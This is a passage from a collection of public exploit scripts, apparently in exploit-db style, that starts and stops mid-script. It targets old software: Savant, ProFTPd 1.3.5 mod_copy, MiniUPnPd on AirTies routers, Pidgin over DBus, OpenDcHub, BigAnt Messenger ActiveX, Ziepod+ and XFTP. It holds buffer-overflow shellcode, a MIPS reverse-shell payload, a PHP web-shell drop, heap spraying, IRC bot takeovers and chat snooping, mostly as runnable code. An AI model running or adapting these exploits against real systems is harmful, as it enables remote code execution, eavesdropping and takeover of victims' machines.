"\x03\xe8\x6c\x35\x55\x71\xd4\x35\x72\x12\x3f\x11\x6e\xcf\x09"
"\x5a\xd0\x33\x40\x8e\x3f\x36\xbf\xd7\xd0\x85\x17\x03\xd3\xc4"
"\x7f\x17\x6e\xe8\x0d\xa6\x5f\x9e\xd6\x1b\xf4\x2b\x8c\xb3\xad"
"\x19\xb3\x70\xac\x56\x76\x0c\xfb\x4f\xc4\x99\xdd\x99\x75\x8f"
"\xa8\xfa\x91\x5c\xfb\x26\xbd\x8a\xea\xec\x0d\xf1\x45\x4f\x72"
"\xd1\x02\x47\x9c\xa5\x33\x1e\xf8\xc7\x00\xd2\x3d\x86\xb4\x7c"
"\xb9\x85\x5f\x8c\x40\x58\x7e\x7c\x5d\x76\x3a\xd6\x0b\x9e\xfe"
"\x88\xc7\x60\x56\x99\x19\x7f\x7a\xda\x93\x72\x99\x3f\x69")
 
badbuffer = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # egghunter searching for R0cX
badbuffer += "\x90" * (254 - len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP Overwrite 00401D09 savant.exe POP EBP, RETN
httpmethod = "\xb0\x03\x04\x01\x7B\x14" # MOV AL, 3; ADD AL, 1; JPO 14
 
sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n' + buffer2
 
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()# thehunter.py
# Exploit Title: Pitbull / w3tw0rk Perl IRC Bot Remote Code Execution
# Author: Jay Turla ( @shipcod3 )
# Description: pitbull-w3tw0rk_hunter is POC exploit for Pitbull or w3tw0rk IRC Bot that takes over the owner of a bot which then allows Remote Code Execution.

import socket
import sys

def usage():
     print("USAGE: python thehunter.py nick \n")  
     
def main(argv):
    
    if len(argv) < 2:
        return usage()

    #irc server connection settings
    botnick = sys.argv[1] #admin payload for taking over the w3wt0rk bot
    server = "us.dal.net" #irc server
    channel = "#buhaypirata" #channel where the bot is located

    irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
    print "connecting to:"+server
    irc.connect((server, 6667)) #connects to the server
    irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :I eat w3tw0rk bots!\n") #user authentication
    irc.send("NICK "+ botnick +"\n") #sets nick
    irc.send("JOIN "+ channel +"\n") #join the chan
    irc.send("PRIVMSG "+channel+" :!bot @system 'uname -a' \n") #send the payload to the bot

    while 1:    #puts it in a loop
        text=irc.recv(2040)  #receive the text
        print text   #print text to console

        if text.find('PING') != -1:                          #check if 'PING' is found
            irc.send('PONG ' + text.split() [1] + '\r\n') #returnes 'PONG' back to the server (prevents pinging out!)
        if text.find('!quit') != -1: #quit the Bot
            irc.send ("QUIT\r\n") 
            sys.exit()
        if text.find('Linux') != -1:                         
            irc.send("PRIVMSG "+channel+" :The bot answers to "+botnick+" which allows command execution \r\n")
            irc.send ("QUIT\r\n")
            sys.exit()

if __name__ == "__main__":
    main(sys.argv)
# Title: ProFTPd 1.3.5 Remote Command Execution
# Date : 20/04/2015
# Author: R-73eN
# Software: ProFTPd 1.3.5 with mod_copy
# Tested : Kali Linux 1.06
# CVE : 2015-3306
# Greetz to Vadim Melihow for all the hard work .
import socket
import sys
import requests
#Banner
banner = ""
banner += "  ___        __        ____                 _    _  \n"  
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if(len(sys.argv) < 4):
    print '\n Usage : exploit.py server directory cmd'
else:
	server = sys.argv[1] #Vulnerable Server
	directory = sys.argv[2] # Path accessible from web .....
	cmd = sys.argv[3] #PHP payload to be executed
	evil = '<?php system("' + cmd + '") ?>'
	s.connect((server, 21))
	s.recv(1024)
	print '[ + ] Connected to server [ + ] \n'
	s.send('site cpfr /etc/passwd')
	s.recv(1024)
	s.send('site cpto ' + evil)
	s.recv(1024)
	s.send('site cpfr /proc/self/fd/3')
	s.recv(1024)
	s.send('site cpto ' + directory + 'infogen.php')
	s.recv(1024)
	s.close()
	print '[ + ] Payload sended [ + ]\n'
	print '[ + ] Executing Payload [ + ]\n'
	r = requests.get('http://' + server + '/infogen.php') #Executing PHP payload through HTTP
	if (r.status_code == 200):
		print '[ * ] Payload Executed Succesfully [ * ]'
	else:
		print ' [ - ] Error : ' + str(r.status_code) + ' [ - ]'
		
print '\n http://infogen.al/'#
# legend_rce.py
# Legend Perl IRC Bot Remote Code Execution PoC
# author: Jay Turla ( @shipcod3 )
# description: This is a RCE PoC for Legend Bot which has been used in the Shellshock spam October 2014. 
# reference: http://www.csoonline.com/article/2839054/vulnerabilities/report-criminals-use-shellshock-against-mail-servers-to-build-botnet.html
# greetz to ROOTCON (rootcon.org) goons
#

import socket
import sys

def usage():
     print("USAGE: python legend_rce.py nick")
     print("Sample nicks found in the wild: god, ARZ, Zax, HackTech, TheChozen")
     
def main(argv):
    
    if len(argv) < 2:
        return usage()

    #irc server connection settings
    botnick = sys.argv[1] #admin payload for taking over the Legend Bot
    server = "80.246.50.71" #irc server
    channel = "#Apache" #channel where the bot is located

    irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
    print "connecting to:"+server
    irc.connect((server, 2015)) #connects to the server, you can change the port by changing 2015 for example :)
    irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :legend.rocks\n") #user authentication
    irc.send("NICK "+ botnick +"\n") #sets nick
    irc.send("JOIN "+ channel +"\n") #join the chan
    irc.send("PRIVMSG "+channel+" :!legend @system 'uname -a' \n") #send the payload to the bot

    while 1:    #puts it in a loop
        text=irc.recv(2040)  #receive the text
        print text   #print text to console

        if text.find('PING') != -1:                          #check if 'PING' is found
            irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server (prevents pinging out!)
        if text.find('!quit') != -1: #quit the Bot
            irc.send ("QUIT\r\n") 
            sys.exit()
        if text.find('Linux') != -1:                         
            irc.send("PRIVMSG "+channel+" :The bot answers to "+botnick+" which allows command execution \r\n")
            irc.send ("QUIT\r\n")
            sys.exit()

if __name__ == "__main__":
    main(sys.argv)
#!/usr/bin/env python

# Exploit Title: MiniUPnPd 1.0 Stack Overflow RCE for AirTies RT Series
# Date: 26.04.2015
# Exploit Author: Onur ALANBEL (BGA)
# Vendor Homepage: http://miniupnp.free.fr/
# Version: 1.0
# Architecture: MIPS
# Tested on: AirTies RT-204v3
# CVE : 2013-0230
# Exploit gives a reverse shell to lhost:lport
# Details: https://www.exploit-db.com/docs/36806.pdf

import urllib2
from string import join
from argparse import ArgumentParser
from struct import pack
from socket import inet_aton

BYTES = 4


def hex2str(value, size=BYTES):
    data = ""

    for i in range(0, size):
        data += chr((value >> (8*i)) & 0xFF)

    data = data[::-1]

    return data


arg_parser = ArgumentParser(prog="miniupnpd_mips.py", description="MiniUPnPd \
                            CVE-2013-0230 Reverse Shell exploit for AirTies \
                            RT Series, start netcat on lhost:lport")
arg_parser.add_argument("--target", required=True, help="Target IP address")
arg_parser.add_argument("--lhost", required=True, help="The IP address\
                        which nc is listening")
arg_parser.add_argument("--lport", required=True, type=int, help="The\
                        port which nc is listening")

args = arg_parser.parse_args()

libc_base = 0x2aabd000
ra_1 = hex2str(libc_base + 0x36860)     # ra = 1. gadget
s1 = hex2str(libc_base + 0x1636C)       # s1 = 2. gadget
sleep = hex2str(libc_base + 0x35620)    # sleep function
ra_2 = hex2str(libc_base + 0x28D3C)     # ra = 3. gadget
s6 = hex2str(libc_base + 0x1B19C)       # ra = 4.gadget
s2 = s6
lport = pack('>H', args.lport)
lhost = inet_aton(args.lhost)

shellcode = join([
    "\x24\x11\xff\xff"
    "\x24\x04\x27\x0f"
    "\x24\x02\x10\x46"
    "\x01\x01\x01\x0c"
    "\x1e\x20\xff\xfc"
    "\x24\x11\x10\x2d"
    "\x24\x02\x0f\xa2"
    "\x01\x01\x01\x0c"
    "\x1c\x40\xff\xf8"
    "\x24\x0f\xff\xfa"
    "\x01\xe0\x78\x27"
    "\x21\xe4\xff\xfd"
    "\x21\xe5\xff\xfd"
    "\x28\x06\xff\xff"
    "\x24\x02\x10\x57"
    "\x01\x01\x01\x0c"
    "\xaf\xa2\xff\xff"
    "\x8f\xa4\xff\xff"
    "\x34\x0f\xff\xfd"
    "\x01\xe0\x78\x27"
    "\xaf\xaf\xff\xe0"
    "\x3c\x0e" + lport +
    "\x35\xce" + lport +
    "\xaf\xae\xff\xe4"
    "\x3c\x0e" + lhost[:2] +
    "\x35\xce" + lhost[2:4] +
    "\xaf\xae\xff\xe6"
    "\x27\xa5\xff\xe2"
    "\x24\x0c\xff\xef"
    "\x01\x80\x30\x27"
    "\x24\x02\x10\x4a"
    "\x01\x01\x01\x0c"
    "\x24\x0f\xff\xfd"
    "\x01\xe0\x78\x27"
    "\x8f\xa4\xff\xff"
    "\x01\xe0\x28\x21"
    "\x24\x02\x0f\xdf"
    "\x01\x01\x01\x0c"
    "\x24\x10\xff\xff"
    "\x21\xef\xff\xff"
    "\x15\xf0\xff\xfa"
    "\x28\x06\xff\xff"
    "\x3c\x0f\x2f\x2f"
    "\x35\xef\x62\x69"
    "\xaf\xaf\xff\xec"
    "\x3c\x0e\x6e\x2f"
    "\x35\xce\x73\x68"
    "\xaf\xae\xff\xf0"
    "\xaf\xa0\xff\xf4"
    "\x27\xa4\xff\xec"
    "\xaf\xa4\xff\xf8"
    "\xaf\xa0\xff\xfc"
    "\x27\xa5\xff\xf8"
    "\x24\x02\x0f\xab"
    "\x01\x01\x01\x0c"
    ], '')

payload = 'C'*2052 + s1 + 'C'*(4*4) + s6 + ra_1 + 'C'*28 + sleep + 'C'*40 + s2\
    + ra_2 + 'C'*32 + shellcode


soap_headers = {
    'SOAPAction': "n:schemas-upnp-org:service:WANIPConnection:1#" + payload,
}

soap_data = """
    <?xml version='1.0' encoding="UTF-8"?>
    <SOAP-ENV:Envelope
    SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
    xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
    >
    <SOAP-ENV:Body>
    <ns1:action xmlns:ns1="urn:schemas-upnp-org:service:WANIPConnection:1"\
        SOAP-ENC:root="1">
    </ns1:action>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    """

try:
    print "Exploiting..."
    req = urllib2.Request("http://" + args.target + ":5555", soap_data,
                          soap_headers)
    res = urllib2.urlopen(req).read()
except:
    print "Ok"
source: http://www.securityfocus.com/bid/52175/info

libpurple is prone to an information-disclosure vulnerability.

Successful exploits may allow attackers to obtain potentially sensitive information that may aid in other attacks.

The following products are vulnerable:

libpurple versions prior to 2.10.1
pidgin versions prior to 2.10.1
pidgin-otr versions prior to 3.2.0 

#!/usr/bin/env python
# PoC for snooping on pidgin discussions (OTR/non-OTR) via dbus
# (see CVE-2012-1257)
#
# requires python-dbus and python-gobject
#
# based on sample code found here:
# http://developer.pidgin.im/wiki/DbusHowto
#
# Disclaimer: There's virtually no error handling here,
# so don't rely on this for any serious work.
#
# Author:
# Dimitris Glynos :: { dimitris at census dash labs dot com }

import dbus, gobject, os, sys
from dbus.mainloop.glib import DBusGMainLoop

# same owner processes get to snoop their respective DBUS credentials
# via /proc/<pid>/environ

def obtain_dbus_session_creds():
	all_pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
	env_tmpl = '/proc/%s/environ'
	session_creds = {}

	for pid in all_pids:
		if not (os.stat(env_tmpl % pid).st_uid == os.getuid()):
			continue
		if not os.access(env_tmpl % pid, os.R_OK):
			continue

		f = open(env_tmpl % pid, 'rb')
		contents = f.read()
		f.close()
		for var in contents.split('\0'):
			if var.startswith('DBUS_SESSION_BUS_ADDRESS='):
				val = var[var.index('=')+1:]
				if not session_creds.has_key(val):
					session_creds[val] = 1
	return session_creds

def recvs(account, contact, msg, conversation, flags):
	print "received '%s' from %s" % (msg, contact)

def sends(account, contact, msg, conversation, flags):
	if flags == 1:
		print "sent '%s' to %s" % (msg, contact)

if not os.environ.has_key('DBUS_SESSION_BUS_ADDRESS'):
	creds = obtain_dbus_session_creds()

	if len(creds.keys()) == 0:
		print >> sys.stderr, ( "error: no dbus session " +
			"credentials could be recovered." )
		sys.exit(1)

	if len(creds.keys()) > 1:
		print >> sys.stderr, ( "error: multiple dbus session " +
			"credentials found!\nPlease rerun with the proper "+
			"DBUS_SESSION_BUS_ADDRESS env variable\n" +
			"Here are the recovered credentials:\n")
		for k in creds.keys():
			print >> sys.stderr, "DBUS_SESSION_BUS_ADDRESS=%s" % k
		sys.exit(1)

	os.environ["DBUS_SESSION_BUS_ADDRESS"] = creds.keys()[0]

dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
bus = dbus.SessionBus()

bus.add_signal_receiver(
	recvs,
	dbus_interface="im.pidgin.purple.PurpleInterface",
	signal_name="ReceivedImMsg"
)

bus.add_signal_receiver(
	sends,
	dbus_interface="im.pidgin.purple.PurpleInterface",
        signal_name="WroteImMsg"
)

mainloop = gobject.MainLoop()
mainloop.run()#!/usr/bin/python
#
# OpenDcHub 0.8.1 Remote Code Execution Exploit
# Pierre Nogues - http://www.indahax.com
#
# Description:
#     OpenDcHub is a direct connect hub for Linux
#
#     OpenDcHub doesn't handle specially crafted MyINFO message which lead to a stack overflow.
#
# Affected versions :
#     OpenDcHub 0.8.1
#
# Plateforms :
#     Unix
#
# Usage :
#     ./exploit.py

import socket

host = '192.168.1.9'
port = 5000

# must not contain \x36 \x53 \x00 bytes
# max shellcode size = 103 bytes use exploit v2 otherwise
shellcode="\x33\xc9\xb1\x13\xba\xf6\x1d\xe7\xfa\xdb\xde\xd9\x74\x24"
shellcode+="\xf4\x5e\x83\xc6\x04\x31\x56\x0a\x03\xa0\x17\x05\x0f\x7d"
shellcode+="\xf3\x3e\x13\x2e\x40\x92\xbe\xd2\xcf\xf5\x8f\xb4\x02\x75"
shellcode+="\xb4\x66\xf5\xb6\xe3\x97\x37\x51\x9c\x86\x6b\xfb\x0f\xc2"
shellcode+="\x83\x52\xe0\x9b\x45\x17\x6a\xfd\xdd\x55\xea\x58\x59\xbc"
shellcode+="\x5b\x65\xa8\xbf\xd5\xe0\xcb\x90\x8d\x3d\x03\x62\x26\x29"
shellcode+="\x74\xe6\xdf\xc7\x03\x05\x4f\x44\x9d\x2b\xc0\x61\x50\x2b"
shellcode+="\x2b"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send("$ValidateNick joseph|")

hax="$MyINFO $ALL joseph "
hax+=shellcode
for i in range(103 - len(shellcode)):
     hax+="A"
hax+="$"
hax+="\x20\x81\x81\x80" # esp
hax+="\xed\xf6\xfe\xbf" # eip
hax+="S:-1|"

s.send(hax)
s.close()

"""
# V2
# more complex version working too, it have more space for the shellcode

hax="$MyINFO $ALL joseph AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
hax+="\xFF\xFF\xFF\xFE" # local var int len of commands.c:my_info() must be a negative value
hax+="TTTTUUUUVVVVWWWWXXXXYYYYZZZZBBBBCCCCEEEEEEE$"
hax+="\x20\x81\x81\x80" # esp
hax+="\x80\xf7\xfe\xbf" # eip
hax+="\xCC\xCC\xCC\xCC" # useless var
hax+="\x10\xf0\xfe\xbf" # this address + x20 will be overwritten by 4 bytes
# shellcode time
hax+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
hax+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
hax+=shellcode
hax+="|"
"""
#!/usr/bin/python
# #########################################################################################
# Bigant Messenger <= v2.52 - (AntCore.dll) RegisterCom() Remote 0day Heap Overflow Exploit
# Found by: Steven Seeley - mr_me( AT )corelan.be - http://net-ninja.net/
# Homepage: http://www.bigantsoft.com/
# Download: http://www.bigantsoft.com/download.html
# Tested on: Windows XP SP3 (IE 6 & 7)
# Marked safe for scripting: No
# Advisory: http://www.corelan.be:8800/advisories.php?id=10-033
# Patch: http://www.bigantsoft.com/software/BigAnt255SP8.zip
# Greetz: Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
# ########################################################################################
# Note: There are many other vulnerable controls in this dll such as ListBoard().
# ########################################################################################
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.
# ########################################################################################
from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

class myRequestHandler(BaseHTTPRequestHandler):
  def do_GET(self):
    self.printCustomHTTPResponse(200)
    if self.path == "/":
        target=self.client_address[0]
        self.wfile.write("""<html>
<object classid='clsid:25745F2B-2AC9-4551-948B-574C50D4EE59' id='boom' ></object>
<script language="JavaScript" defer>
  	//calc.exe
  var sCode = unescape("%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800" +
                       "%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A" +
                       "%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350" +
                       "%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40" +
                       "%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000" +
                       "%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040" +
                       "%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD" +
                       "%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40" +
                       "%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18" +
                       "%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0" +
                       "%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B" +
                       "%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24" +
                       "%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9" +
                       "%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C" +
                       "%u652E%u6578%u9000");
  var sSlide = unescape("%u9090%u9090");
  var heapSA = 0x0c0c0c0c;
  function tryMe()
   {
    var buffSize = 5140;
    var x =  unescape("%0a%0a%0a%0a");
    while (x.length<buffSize) x += x;
    x = x.substring(0,buffSize);
    boom.RegisterCom(x,1,1);
  }
  function getsSlide(sSlide, sSlideSize)
   {
    while (sSlide.length*2<sSlideSize)
     {
      sSlide += sSlide;
     }
    sSlide = sSlide.substring(0,sSlideSize/2);
    return (sSlide);
  }
  var heapBS = 0x400000;
  var sizeHDM = 0x5;
  var PLSize = (sCode.length * 2);
  var sSlideSize = heapBS - (PLSize + sizeHDM);
  var heapBlocks = (heapSA+heapBS)/heapBS;
  var memory = new Array();
  sSlide = getsSlide(sSlide,sSlideSize);
  for (i=0;i<heapBlocks;i++)
   {
    memory[i] = sSlide +  sCode;
   }
</script>
<body onload="JavaScript: return tryMe();">
<p><center>~ mr_me presents ~</p>
<p><b>Bigant Messenger <= v2.52 - (AntCore.dll) RegisterCom() Remote 0day Heap Overflow Exploit</b></center></p>
</body>
</html>""")
        print ("\n\n(+) Exploit sent to the target %s." % (target))

  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header("Content-type", "text/html")
    self.send_header("Server", "myRequestHandler")
    self.end_headers()

httpd = HTTPServer(('', 80), myRequestHandler)

print ("""
\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\tBigant Messenger <= v2.52 - (AntCore.dll) RegisterCom() Remote 0day Heap Overflow Exploit
\tFound by: Steven Seeley - mr_me( AT )corelan.be
\tTested on windows XP sp3 (IE 6/7)
\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
""")
print ("(+) Listening on port 80.")
print ("(+) Have someone connect to you.")
print ("\nType <ctrl>-c to exit..")
try:
     httpd.handle_request()
     httpd.serve_forever() 
except KeyboardInterrupt:
       print ("\n\n(-) Exiting Exploit.\n\n")
       sys.exit(1)
#!/usr/bin/python

import thread
import socket

"""
|------------------------------------------------------------------|
|                         __               __                      |
|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
|                                                                  |
|                                       http://www.corelan.be:8800 |
|                                                                  |
|-------------------------------------------------[ EIP Hunters ]--|


Ziepod+ 1.0 Cross Application Scripting
Advisory: CORELAN-10-037
http://www.corelan.be:8800/advisories.php?id=CORELAN-10-037
Found and coded by sinn3r  -  x90.sinner{at}gmail{d0t}com
http://twitter.com/_sinn3r

Tested Machine:
Windows XP SP3 ENG + IE 7.0
Windows 7 Ultimate + IE 8.0

Description:
Ziepod/Ziepod+ is vulnerable to cross application scripting when processing an XML subscription.
In order to carry about the attack, the attacker must serve the malicious XML file on a web
server first and trick the user into adding it to the subscription.  Once the XML is automatically
loaded, the JavaScript will execute, the attacker is capable of any of the following depending
on the browser:
 1. Modify the application contents in Ziepod
 2. View/transfer/write data on the victim machine
 3. Inject malware on the victim machine using, for example, an iframe

This payload of this script is pretty harmless, it just mimics a "ping"
request using XMLHttpRequest(). When you see the "PING!", that indicates
the remote machine is vulnerable to this attack.

Disclosure:
04-20-2010: Vendor contacted
04-28-2010: Reminder sent
05-05-2010: Still no response from vendor, POC released.

Demo:
sinn3r@bt:~/sploits# ./ziepod1_0.py
[*] Ziepod+ 1.0 Cross Application Scripting
[*] coded by sinn3r  -  x90.sinner{at}gmail{d0t}com
[*] Waiting for a ping from the Ziepod user at 0.0.0.0:4444
[*] Running web server at 0.0.0.0:80
[*] Fake podcast XML sent
[*] 192.168.3.111 says "PING!"... it is vulnerable.
"""

## We put a null byte in front of the tag to prevent it being displayed in some areas
## the isIndex trick isn't the only way to run JavaScript, of course.
## Make sure to modify the destination address
payload = (
"%00%3cscript%3e"
"h=new ActiveXObject('Microsoft.XMLHTTP');h.open('POST', 'http://192.168.3.106:4444',false);h.send('PING!!');"
"%3c/script%3e");

## XML template
## The <description> tag isn't the only place to inject code, but you get the point
_xml = """<?xml version="1.0" encoding="utf-8"?>
<rss xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dcterms="http://purl.org/dc/terms/">
  <channel>
    <title>Channel Title</title>
    <link>http://google.com/</link>
    <description>Channel Description</description>
    <language>en-us</language>
    <generator>n0body</generator>

    <pubDate>Sat, 17 Apr 2010 00:37:29 GMT</pubDate>
    <itunes:keywords>keyword1,keyword2</itunes:keywords>
    <itunes:subtitle>Channel subtitle.</itunes:subtitle>
    <itunes:owner>
      <itunes:name>Channel Hsowner's name</itunes:name>
      <itunes:email>Channel Is owner's email</itunes:email>

    </itunes:owner>
    <itunes:explicit>clean</itunes:explicit>
    <itunes:block>sno</itunes:block>
    <itunes:image href="http://google.com/image.jpg"/>
    <itunes:author>sinn3r</itunes:author>
    <itunes:summary>sinn3r is phat</itunes:summary>
    <itunes:category text="exploit">

      <itunes:category text="exploit"/>
    </itunes:category>
    <atom:link href="http://www.google.com/rss2.xml" type="application/rss+xml" rel="self"/>
    <item>
      <title>This is a podcast, really</title>
      <description>This is a podcast that doesn't do anything, really.%s</description>
      <guid isPermaLink="true">http://www.google.com</guid>

      <comments>No comment</comments>
      <pubDate>Sat, 17 Apr 2010 00:28:17 GMT</pubDate>
      <dcterms:modified>2010-17</dcterms:modified>
      <dcterms:created>2010-04-17</dcterms:created>
      <link>http://www.google.com</link>
      <dc:creator>podcast creator</dc:creator>

      <itunes:keywords>podcast1_keyword1</itunes:keywords>
      <enclosure url="http://www.google.com/s.mp3" type="audio/mpeg" length="3214628"/>
      <itunes:image href="http://someurl/s.jpg"/>
      <itunes:duration>267</itunes:duration>
      <itunes:explicit>clean</itunes:explicit>
      <itunes:summary>s</itunes:summary>
    </item>
  </channel>
</rss>

""" %payload

## Listen for the payload's "ping" at port 4444
def runReceiver():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", 4444))
	s.listen(1)
	print "[*] Waiting for a ping from the Ziepod user at 0.0.0.0:4444"
	while 1:
		c, addr = s.accept()
		#print "[*] Remote user %s says:" %addr[0],
		while 1:
			data = c.recv(1024)
			if not data or data.find("PING!!") >= 0:
				print "[*] %s says \"PING!\"... it is vulnerable." %addr[0]
				break
		c.close()

## Fake a web server so we can serve the app with fake podcasts.
def runServer():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("0.0.0.0", 80))
	s.listen(1)
	print "[*] Running web server at 0.0.0.0:80"
	while 1:
		c, addr = s.accept()
		c.send(_xml)
		print "[*] Fake podcast XML sent"
		c.close()

if __name__ == "__main__":
	print "[*] Ziepod+ 1.0 Cross Application Scripting"
	print "[*] coded by sinn3r  -  x90.sinner{at}gmail{d0t}com"
	thread.start_new_thread(runReceiver, ())
	runServer()
#!/usr/bin/python

import socket
import sys

"""
|------------------------------------------------------------------|
|                         __               __                      |
|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
|                                                                  |
|                                       http://www.corelan.be:8800 |
|                                                                  |
|-------------------------------------------------[ EIP Hunters ]--|

XFTP 3.0 Build 0239 Long filename Buffer Overflow
Tested on: BT4 (attacker) + Windows XP SP3 ENG (victim) + XFTP 3.0 Build 0239 or 0238
Found and coded by sinn3r  -  x90.sinner{at}gmail{d0t}c0m
Issue fixed in version : v3.0 Build 0242 & 0243
Greetz: Corelan Security & Exploit-DB.com
http://twitter.com/_sinn3r
Thanks : Corelan Security would like to thank NetSarang, Inc. for working with us and
         resolving the issue; Special thanks to Andrew Chang for communication.
	 Also thanks to corelanc0d3r

Description:
NetSarang XFTP 3.0 is a FTP client that is vulnerable to a buffer overflow when handling
a long file name retrieved using "LIST". In order to trigger the overflow, the attacker
must serve the malicious response as a FTP server, and trick the victim into double
clicking on the filename.  This proof of concept uses ACTIVE mode to transfer. If the
first LIST transfer fails, reconnect again.

Please Note :
1) Script provided 'as is', without any warranty. Use for educational
   purposes only.  Do not use this code to do anything illegal.
2) You are not allowed to edit/modify this code. If you do, Corelan cannot be
   held responsible for any damages this may cause.

Timeline:
05/17/10   - Vendor contacted
05/25/10   - Reminder sent
05/26/10   - Patched version received (v3.0 0242)
05/31/2010 - Xftp 3.0 Build 0243 released.  Public.

For more technical details, visit:
http://www.corelan.be:8800/advisories.php?id=CORELAN-10-046
"""

## ./msfpayload windows/messagebox exitfunc=thread TEXT="by sinn3r" TITLE="Demo by Corelan"
messagebox = (
"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIHYJKMK8Y2T7TZTP1XRNRRZVQ9YSTL"
"KT1VPLKSFDLLKSFULLKG6THLK3NQ0LK7FP80OUH2UL3V95Q8QKOM1CPLK2LFD6DLKW5GLLK1DUU48C1JJLKQZUHL"
"K1JWP31ZKKSVWG9LKP4LKEQJNP1KO6Q9PKLNLMTIP2TDJIQXOTMC1HGM9L1KOKOKOGKSLFDQ8RUYNLK0ZVDS1JKU"
"6LKTLPKLK0ZELUQJKLKUTLK5QM8MYPDVDEL3QO3OB5XQ9YDMYZEK9O2RHLNPNDNZL62KXMLKOKOKOK9QUUTOKZO8"
"NKPSPLGULWTPRZHLKKOKOKOLIW5THBH2LRL7PKO58VS6RVNU4CXT5T3CUCBK8QL7TUZMYM6PVKOV55TMYHBF0OKO"
"XY20MOLLG5LFD0RM8QNKOKOKO582LSQ2NPXU8QS2OBRSUE8GPSRSIQ058G42ERMRO6Q9KMXQLWT4OK9JC3X2R68W"
"P10SX592NRNVSE8U2BY7PRSVQIYMX0LQ439K9KQFQYBQB63PQPRKON06QIPPPKOF5UXEZA"
);

## EAX getPC
getpc= (
"\x75\x03\x58\xff\xd0\xe8\xf8\xff"
"\xff\xff"
);

## The filename which contains our malicious code
## Peter's test: offset=232 bytes to EIP
evil = (
